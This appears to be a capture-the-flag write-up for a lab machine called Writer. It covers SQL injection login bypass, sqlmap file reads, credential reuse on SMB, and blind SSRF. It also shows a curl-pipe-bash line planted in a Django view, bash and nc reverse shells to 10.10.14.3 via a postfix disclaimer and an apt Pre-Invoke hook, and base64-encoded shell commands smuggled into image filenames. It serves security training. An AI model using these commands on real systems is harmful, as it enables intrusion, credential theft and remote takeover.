@@ -1,0 +1,637 @@
+                          Writer
+
+                          12th Dec 2021 / Document No D21.100.144
+                          Prepared By: TheCyberGeek
+                          Machine Author(s): TheCyberGeek
+                          Difficulty: Medium
+
+Classification: Official
+Synopsis
+
+Writer is a medium Linux machine that outlines poor coding practices and presents how a file read
+vulnerability through SQL injection can lead to disclosure of source code files which include credentials. The
+combination of password reuse on the SMB service with a blind SSRF exploitation via an image upload
+function can lead to a foothold on the system. By abusing Django features it is possible to extract and crack
+user credentials. Further abusing multiple misconfigurations in Postfix service leads to exploit privileges in
+the apt service folders allowing those users to execute commands as root through a script that updates the
+machine every minute.
+
+Skills Required
+
+      Understanding of Python Django
+      Web skills
+      SQL Knowledge
+      Source Code Review
+      POSTFIX basic knowledge
+      SMB usage
+      Researching skills
+
+Skills Learned
+
+      Vulnerability detection in Python
+      UNION based SQL Injections
+      Local File Inclusion
+      Virtual Host enumeration
+      Django hash cracking
+      Blind SSRF injection
+      Identifying system misconfigurations
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.101 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV 10.10.11.101
+
+The nmap scan shows that SSH, SMB and a website are listening on their default ports. Checking the SMB
+shows we cannot access the service without authentication so we take a look at the website.
+We see a website containing stories with no further information other than a domain name on the footer of
+the page Writer.HTB so we add that entry to our /etc/hosts file.
+
+   echo "10.10.11.101 writer.htb" >> /etc/hosts
+Next we perform some directory enumeration to see if there are any directories that may be of interest to
+us.
+
+   gobuster dir --url http://writer.htb --wordlist
+   /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+We navigate to the administrative page and we are presented with a login portal.
+Attempting an authentication bypass on the login page shows that we can perform SQL injections against
+the login form and thus get unauthorized access to the administrator dashboard.
+
+   admin' or 1 = 1 -- -
+
+Checking out some of the functionality of the site we notice that we can add stories or edit stories and both
+options have a ability to upload image from URL.
+
+Inspecting the element we see that there is client side checks for the URL address.
+   <input class="form-control" type="url" pattern="http(s?)(:\/\/)((www.)?)(([^.]+)\.)?
+   ([a-zA-z0-9\-_]+)(.com|.net|.gov|.org|.in|.co.uk)(\/[^\s]*)?" name="image_url"
+   title="Special characters are not allowed!">
+Now that we can't find anything of immediate interest on the web application we can capture a login
+attempt in BurpSuite and save the output to file, then use sqlmap to explore the SQL injection.
+
+   sqlmap -r login.req
+
+We can enumerate the databases available.
+   sqlmap -r login.req --dbs
+We can also check the tables of the writer database.
+   sqlmap -r login.req -D writer --tables
+
+Then dump the users table.
+   sqlmap -r login.req -D writer -T users --dump
+Trying to crack the password is unsuccessful so we further check the privileges of the database user.
+   sqlmap -r login.req --privileges
+We can see that the admin user has FILE privilege on the SQL database. This means that the user can read
+and write internal files. So using this information we can try to read the /etc/passwd file.
+
+   sqlmap -r login.req --file-read=/etc/passwd
+
+Reading the file we discover two (2) usernames: kyle and john .
+Next we check the apache virtual host configuration to find if we can locate the absolute directory of the
+web application so to read the source code of the files.
+
+   sqlmap -r login.req --file-read=/etc/apache2/sites-enabled/000-default.conf
+
+Reading the file we observe some interesting entries.
+
+   # Virtual host configuration for writer.htb domain
+   <VirtualHost *:80>
+
+                 ServerName writer.htb
+                 ServerAdmin admin@writer.htb
+                 WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
+                 <Directory /var/www/writer.htb>
+
+                                Order allow,deny
+                                Allow from all
+                 </Directory>
+                 Alias /static /var/www/writer.htb/writer/static
+                 <Directory /var/www/writer.htb/writer/static/>
+                                Order allow,deny
+                                Allow from all
+                 </Directory>
+                 ErrorLog ${APACHE_LOG_DIR}/error.log
+                 LogLevel warn
+                 CustomLog ${APACHE_LOG_DIR}/access.log combined
+   </VirtualHost>
+
+   # Virtual host configuration for dev.writer.htb subdomain
+   # Will enable configuration after completing backend development
+   # Listen 8080
+   #<VirtualHost 127.0.0.1:8080>
+   # ServerName dev.writer.htb
+   # ServerAdmin admin@writer.htb
+   #
+
+                 # Collect static for the writer2_project/writer_web/templates
+   # Alias /static /var/www/writer2_project/static
+# <Directory /var/www/writer2_project/static>
+
+# Require all granted
+
+# </Directory>
+
+#
+
+# <Directory /var/www/writer2_project/writerv2>
+
+# <Files wsgi.py>
+
+#  Require all granted
+
+# </Files>
+
+# </Directory>
+
+#
+
+# WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-
+
+home=/var/www/writer2_project/writer2env
+
+# WSGIProcessGroup writer2_project
+
+# WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
+
+#  ErrorLog ${APACHE_LOG_DIR}/error.log
+
+#  LogLevel warn
+
+#  CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+#
+
+#</VirtualHost>
+
+We spot the absolute directory for the web application running on port 80. We tried visiting
+/var/www/writer.htb/writer/app.py but the application unfortunately did not exist. So we tried to
+download the /var/www/writer.htb/writer.wsgi to check what kind of application we are dealing with.
+
+sqlmap -r login.req --file-read=/var/www/writer.htb/writer.wsgi
+   #!/usr/bin/python
+   import sys
+   import logging
+   import random
+   import os
+
+   # Define logging
+   logging.basicConfig(stream=sys.stderr)
+   sys.path.insert(0,"/var/www/writer.htb/")
+
+   # Import the __init__.py from the app folder
+   from writer import app as application
+   application.secret_key = os.environ.get("SECRET_KEY", "")
+
+We can spot a comment that imports the __init__.py from the application's folder, so we tried to retrieve
+it.
+
+   sqlmap -r login.req --file-read=/var/www/writer.htb/writer/__init__.py
+
+   <SNIP>
+   #Define connection for database
+   def connections():
+
+          try:
+                 connector = mysql.connector.connect(user='admin',
+
+   password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
+   <SNIP>
+   @app.route('/dashboard/stories/add', methods=['GET', 'POST'])
+   <SNIP>
+
+                 if request.files['image']:
+                         image = request.files['image']
+                         if ".jpg" in image.filename:
+                                path = os.path.join('/var/www/writer.htb/writer/static/img/',
+
+   image.filename)
+                                image.save(path)
+                                image = "/img/{}".format(image.filename)
+                     else:
+                             error = "File extensions must be in .jpg!"
+                             return render_template('add.html', error=error)
+
+              if request.form.get('image_url'):
+                     image_url = request.form.get('image_url')
+                     if ".jpg" in image_url:
+                             try:
+                                    local_filename, headers = urllib.request.urlretrieve(image_url)
+                                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
+                                    image = "{}.jpg".format(local_filename)
+                                    try:
+                                           im = Image.open(image)
+                                           im.verify()
+                                           im.close()
+                                           image = image.replace('/tmp/','')
+                                           os.system("mv /tmp/{}
+
+/var/www/writer.htb/writer/static/img/{}".format(image, image))
+                                           image = "/img/{}".format(image)
+
+                                    except PIL.UnidentifiedImageError:
+                                           os.system("rm {}".format(image))
+                                           error = "Not a valid image file!"
+                                           return render_template('add.html', error=error)
+
+                             except:
+                                    error = "Issue uploading picture"
+                                    return render_template('add.html', error=error)
+
+                     else:
+                             error = "File extensions must be in .jpg!"
+                             return render_template('add.html', error=error)
+
+<SNIP>
+@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
+<SNIP>
+
+              if request.files['image']:
+                     image = request.files['image']
+                     if ".jpg" in image.filename:
+                             path = os.path.join('/var/www/writer.htb/writer/static/img/',
+
+image.filename)
+                             image.save(path)
+                             image = "/img/{}".format(image.filename)
+                             cursor = connector.cursor()
+                             cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %
+
+(id)s", {'image':image, 'id':id})
+                             result = connector.commit()
+
+                     else:
+                             error = "File extensions must be in .jpg!"
+                             return render_template('edit.html', error=error, results=results,
+
+id=id)
+              if request.form.get('image_url'):
+                     image_url = request.form.get('image_url')
+                     if ".jpg" in image_url:
+                             try:
+                                    local_filename, headers = urllib.request.urlretrieve(image_url)
+                                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
+                                    image = "{}.jpg".format(local_filename)
+                                    try:
+                                           im = Image.open(image)
+                                           im.verify()
+                                           im.close()
+                                           image = image.replace('/tmp/','')
+                                           os.system("mv /tmp/{}
+
+/var/www/writer.htb/writer/static/img/{}".format(image, image))
+                                           image = "/img/{}".format(image)
+                                           cursor = connector.cursor()
+                                           cursor.execute("UPDATE stories SET image = %(image)s WHERE id =
+
+%(id)s", {'image':image, 'id':id})
+                                           result = connector.commit()
+
+                                    except PIL.UnidentifiedImageError:
+                                           os.system("rm {}".format(image))
+                                           error = "Not a valid image file!"
+                                           return render_template('edit.html', error=error,
+
+results=results, id=id)
+                             except:
+                                    error = "Issue uploading picture"
+                                    return render_template('edit.html', error=error, results=results,
+
+id=id)
+                     else:
+                             error = "File extensions must be in .jpg!"
+                             return render_template('edit.html', error=error, results=results,
+
+id=id)
+<SNIP>
+#Define authentication mechanism
+@app.route('/administrative', methods=['POST', 'GET'])
+def login_page():
+
+       if ('user' in session):
+              return redirect('/dashboard')
+
+       if request.method == "POST":
+              username = request.form.get('uname')
+              password = request.form.get('password')
+              password = hashlib.md5(password.encode('utf-8')).hexdigest()
+              try:
+                     connector = connections()
+              except mysql.connector.Error as err:
+                     return ("Database error")
+              try:
+                     cursor = connector.cursor()
+                     sql_command = "Select * From users Where username = '%s' And password =
+
+'%s'" % (username, password)
+                         cursor.execute(sql_command)
+                         results = cursor.fetchall()
+                         for result in results:
+
+                                print("Got result")
+                         if result and len(result) != 0:
+
+                                session['user'] = username
+                                return render_template('success.html', results=results)
+                         else:
+                                error = "Incorrect credentials supplied"
+                                return render_template('login.html', error=error)
+                 except:
+                         error = "Incorrect credentials supplied"
+                         return render_template('login.html', error=error)
+          else:
+                 return render_template('login.html')
+   <SNIP>
+
+Now that we have the source code we can identify the cause of the SQL injection. Since the developer did
+not use prepared statements to compare the passwords, the SQL statement was able to be extended to
+perform time based attacks and union based attacks.
+
+   sql_command = "Select * From users Where username = '%s' And password = '%s'" %
+   (username, password) # Unsanitised and incorrect usage.
+   # The correct statement would not allow ' to be used thus defending from the injection:
+   # sql_command = "SELECT * FROM users WHERE username = %(username)s AND passworrd = %
+   (password)s;", {'username': username, 'password':password})
+   cursor.execute(sql_command)
+   results = cursor.fetchall()
+   for result in results:
+
+          print("Got result")
+   if result and len(result) != 0:
+
+          session['user'] = username
+          return render_template('success.html', results=results)
+
+Another issue that allows fast retrieval of the internal files is the results parameter being passed into the
+success.html template.
+
+   <header>
+          <h3 class="animation-slide-top">Welcome {% for result in results %}{{result[1]}}{%
+
+   endfor %}</h3>
+   </header>
+   <p class="success-advise">Redirecting you to the dashboard. If you are not redirected
+   then click the button below to be redirected.</p>
+
+Downloading the template and checking the code structure we observe that the developer included a {%
+for result in results %}{{ result[1] }}{% endfor %} which allows us to extend the query and
+output more than one result which in this case is the file we are obtaining from the server as shown in the
+manual Burp interception.
+Referring back to the port scan when initially enumerate the box, we found that SMB is an available service.
+We can now try to check the /etc/samba/smb.conf to see if we can retrieve any important information
+about the SMB share.
+
+   sqlmap -r login.req --file-read=/etc/samba/smb.conf
+
+   [writer2_project]
+      path = /var/www/writer2_project
+      valid users = @smbgroup
+      guest ok = no
+      writable = yes
+      browsable = yes
+
+We understand that the second virtual host entry is linked to the SMB, and so we can have write access to
+the directory if we can somewhow authenticate to the service. We can see from the __init__.py we have
+discovered some credentials but we cannot use them to SSH authenticate, but we discover we can use them
+to authenticate to the SMB as kyle user.
+(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
+   smbclient //writer.htb/writer2_project -U kyle
+
+We can now download the project files that exist in the SMB as well as upload files to the SMB.
+Unfortunately the only files we can really download are writer_web/views.py and
+writer_web/templates/index.html . So we download writer_web/views.py and we check that we can
+edit it in order to code inject.
+
+   # Original code
+   from django.shortcuts import render
+   from django.views.generic import TemplateView
+   def home_page(request):
+
+          template_name = "index.html"
+          return render(request,template_name)
+   # Edited code
+   from django.shortcuts import render
+   from django.views.generic import TemplateView
+   import os
+   def home_page(request):
+          os.system("curl http://10.10.14.3/bash.sh|bash")
+          template_name = "index.html"
+          return render(request,template_name)
+
+We re-upload the code to the server in hopes that we can achieve code execution. Of course we need a way
+also to trigger the page. Referring back to the import from URL functionality of the web application on port
+80, we saw in the __init__.py that there is only one check being conducted despite of the client-side
+validation and the server is only checking that the extension is indeed a .jpg file.
+
+   if request.form.get('image_url'):
+          image_url = request.form.get('image_url')
+          if ".jpg" in image_url:
+                 try:
+                         local_filename, headers = urllib.request.urlretrieve(image_url)
+
+Using burpsuite to intercept the edit request we test a quick theory that should allow us to perform blind
+SSRF. When intercepting the request, we send http://google.com or similar and change it through Burp
+to our IP address, and starting a Python3 web server to check if we get a hit.
+
+We can confirm there is blind SSRF against the target after checking our Python3 HTTP server but sending
+http://127.0.0.1:8080/kali.jpg does not trigger the shell because the web page doesn't exist. We
+check the writer_web/urls.py through SMB to see what URLs exist on that particular web application.
+
+   from django.conf.urls import url
+   from writer_web import views
+   urlpatterns = [
+
+          url(r'^$', views.home_page, name='home'),
+   ]
+So in theory calling / on the internal web application should trigger the reverse shell, so thinking logically,
+we know that websites sometime use #section to load particular parts of the page. With that in mind, we
+created a bash.sh file with the following contents.
+
+   #!/bin/bash
+   bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
+We also start again a python3 -m http.server 80 and try to trigger the web application through Burp
+using http://127.0.0.1:8080/#.jpg as the image URL.
+
+Finally we have access to the system and even we can't see anything of interest right away, by checking the
+database settings in the existing project writerv2/settings.py we spot that the connection settings are
+stored in /etc/mysql/my.cnf .
+
+   DATABASES = {
+          'default': {
+                 'ENGINE': 'django.db.backends.mysql',
+                 'OPTIONS': {
+                         'read_default_file': '/etc/mysql/my.cnf',
+                 },
+          }
+
+   }
+But since we have access to the manage.py we can just authenticate to the dev database and obtain the
+credentials.
+Cracking Django Password Hashes | Lincoln Loop
+Using the above web link's SELECT statement to retrieve the database credentials, we managed to
+appended it in order to reveal us usernames and extracted credentails.
+
+   echo "select username, password from auth_user where is_staff;"| python3 manage.py
+   dbshell > django_hashes.txt
+So now its time to bring it to our local machine and crack the passwords with tool hashcat .
+   hashcat -m 10000 hashes.txt /usr/share/wordlists/rockyou.txt
+After a few minutes the hash is cracked and we indeed have a password of marcoantonio . Finally it is
+possible to authenticate with SSH as user kyle and obtain the user flag.
+Root
+
+By checking the groups for user kyle we notice that is also part of an unusual group called filter .
+
+Checking accessible files to filter group we spot /etc/postfix/disclaimer .
+   find / -group filter 2>/dev/null
+
+Reading the contents of the file we understand that the filter user is applied by adding a disclaimer to
+postfix mail.
+
+   #!/bin/sh
+   # Localize these.
+   INSPECT_DIR=/var/spool/filter
+   SENDMAIL=/usr/sbin/sendmail
+   # Get disclaimer addresses
+   DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
+   # Exit codes from <sysexits.h>
+   EX_TEMPFAIL=75
+   EX_UNAVAILABLE=69
+   # Clean up when done or when aborting.
+   trap "rm -f in.$$" 0 1 2 3 15
+   # Start processing.
+   cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
+   $EX_TEMPFAIL; }
+   cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }
+   # obtain From address
+   from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`
+   if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
+
+      /usr/bin/altermime --input=in.$$ \
+                                     --disclaimer=/etc/postfix/disclaimer.txt \
+                                     --disclaimer-html=/etc/postfix/disclaimer.txt \
+                                     --xheader="X-Copyrighted-Material: Please visit
+
+   http://www.company.com/privacy.htm" || \
+                                       { echo Message content rejected; exit $EX_UNAVAILABLE; }
+
+   fi
+   $SENDMAIL "$@" <in.$$
+   exit $?
+By reviewing the script and searching for more information online we understand that the flow of logic is
+that when a user sends mail through postfix, the filter user launches this disclaimer script to attach the
+disclaimer to mail.
+How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)
+But to be able to trigger the disclaimer file we are going to need both users valid email addresses that are
+located at file /etc/postfix/disclaimer_addresses .
+
+Checking the /etc/postfix/master.cf we found that the disclaimer is executed as user john .
+So we can now change the disclaimer file by adding a reverse shell.
+   #!/bin/sh
+   bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
+   # Localize these.
+   INSPECT_DIR=/var/spool/filter
+   SENDMAIL=/usr/sbin/sendmail
+
+We then access the SMTP on port 25 and send an email from kyle@writer.htb to root@writer.htb and
+try to get a shell.
+
+We notice that we don't get a shell for some reason. We observe that firstly the file has been replaced with
+the original file by cronjob and secondly there is an issue with the script, so executing the
+/etc/postfix/disclaimer after we append our reverse shell one liner to it we get an error.
+
+We edit the disclaimer file again and change from /bin/sh to /bin/bash , by copying the file to a location
+of our choice. We editing and also we can put in a while true loop to replace the file in /etc/postfix/ and
+redo the steps to gain a shell.
+   while true; do cp /home/kyle/disclaimer /etc/postfix/disclaimer; sleep 2; done &
+
+Now that we are user john we can add persistence by echoing our id_rsa.pub into the
+authorized_keys file by importing pty and then generating SSH keys as user john .
+
+   script /dev/null -c bash
+   ssh-keygen
+   echo "ssh-key" >> ~/.ssh/authorized_keys
+We gain SSH access as john . Now with persistence added we check which groups john is a part of.
+
+We search for writeable files or folders which the management group has access to.
+   find / -group management 2>/dev/null
+Checking the permissions of the apt.conf.d we found the read/write/execute privileges.
+
+Reading up for the purpose of this folder we learn that this is a configuration folder containing pre/post
+install scripts for when apt-get update is performed.
+Advanced APT Configuration and Usage | Kali Linux Revealed
+Typically if a system is compromised and a user has root level access, they can plant a backdoor by creating
+a file with a pre/post install script that is triggered when the machine administrator performs apt update
+or apt-get update . This by default does not allow users without root privileges to edit the files in this
+directory.
+Linux for Pentester: APT Privilege Escalation
+We uploaded pspy64 to the target machine and monitored the active processes and observed that root is
+indeed executing apt-get update every minute.
+
+Now if we can plant a kind of backdoor in the /etc/apt/apt.conf.d directory as according to the above
+link, it will spawn a shell as root.
+
+   echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
+   10.10.14.3 4444 >/tmp/f"};' > 000PWNED
+Finally we can read the root flag.
+Unintended Solutions
+
+Due to the lack of sanitization on the image upload, we are able to also bypass the blind SSRF stage and
+directly execute a reverse shell over the website. Analyzing the source code in __init__.py we can see
+that in the way that the temporary file that has been uploaded via URL import is unsafe.
+
+                 if request.files['image']:
+                         image = request.files['image']
+                         if ".jpg" in image.filename:
+                                # VULNERABLE LINE 1
+                                path = os.path.join('/var/www/writer.htb/writer/static/img/',
+
+   image.filename)
+                                image.save(path)
+                                image = "/img/{}".format(image.filename)
+
+                         else:
+                                error = "File extensions must be in .jpg!"
+                                return render_template('add.html', error=error)
+
+                 if request.form.get('image_url'):
+                         image_url = request.form.get('image_url')
+                         if ".jpg" in image_url:
+                                try:
+                                       local_filename, headers = urllib.request.urlretrieve(image_url)
+                                       os.system("mv {} {}.jpg".format(local_filename, local_filename))
+                                       image = "{}.jpg".format(local_filename)
+                                       try:
+                                              im = Image.open(image)
+                                              im.verify()
+                                              im.close()
+                                              image = image.replace('/tmp/','')
+
+                                              # VULNERABLE LINE 2
+                                              os.system("mv /tmp/{}
+   /var/www/writer.htb/writer/static/img/{}".format(image, image))
+                                              image = "/img/{}".format(image)
+                                       except PIL.UnidentifiedImageError:
+                                              os.system("rm {}".format(image))
+                                              error = "Not a valid image file!"
+                                              return render_template('add.html', error=error)
+                                except:
+                                       error = "Issue uploading picture"
+                                       return render_template('add.html', error=error)
+                         else:
+                                error = "File extensions must be in .jpg!"
+                                return render_template('add.html', error=error)
+When path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename) and
+os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image,image)) were
+called there were no checks in place or character replacements allowing users to upload a image with a
+malicious name and trigger it through creating/editing a post and calling the malicious named file via URL
+image uploads.
+So first we can create a post and select an image to upload.
+
+   `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40My85MDAxIDA+JjE=|base64 -d|bash`.jpg
+
+Now we edit the same post and import image from URL.
+   File:///var/www/writer.htb/writer/static/img/`echo
+   YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQ==|base64 -d|bash`.jpg
+
+Now by checking our listener we have a shell as www-data .
+
